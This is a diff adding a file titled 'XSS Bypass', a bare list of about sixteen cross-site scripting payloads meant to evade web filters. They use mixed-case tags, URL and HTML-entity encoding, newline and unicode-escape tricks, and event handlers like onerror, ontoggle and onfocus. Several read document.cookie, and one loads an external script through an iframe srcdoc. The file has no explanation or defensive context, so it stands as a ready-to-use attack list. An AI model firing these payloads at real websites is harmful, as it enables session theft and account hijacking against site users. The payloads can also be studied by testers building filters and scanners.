@@ -1,0 +1,18 @@
+XSS Bypass:
+
+<img src=1 only onerror=alert()>
+<svg%20oNinad=1%20onload=alert(document.cookie)>
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+"%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e"
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+XSS"onfocus="prompt(document.cookie)"autofocus="
+<Iframe SrcDoc="<Script Src=URL></Script>">
+<JavaScript:"\74Svg\57OnLoad\75\141\154\145\162\164\501\51\76"/ContentEditable/AutoFocus/OnFocus=location=tagName>
+“javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie”
+123456%22/%3E%3Cmath%3E%3Carchy%20href=Ja%26Tab;vascript%26colon;console.error(1)%3EARCHY%3C/archy%3E%3C/math%3E%3C!--
+d1bvs%3c%2fscript%3e%3cscript%3ealert(`XSS`)%3c%2fscript%3ec579g
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain 
+<x onpointerrawupdate=prompt()>hi
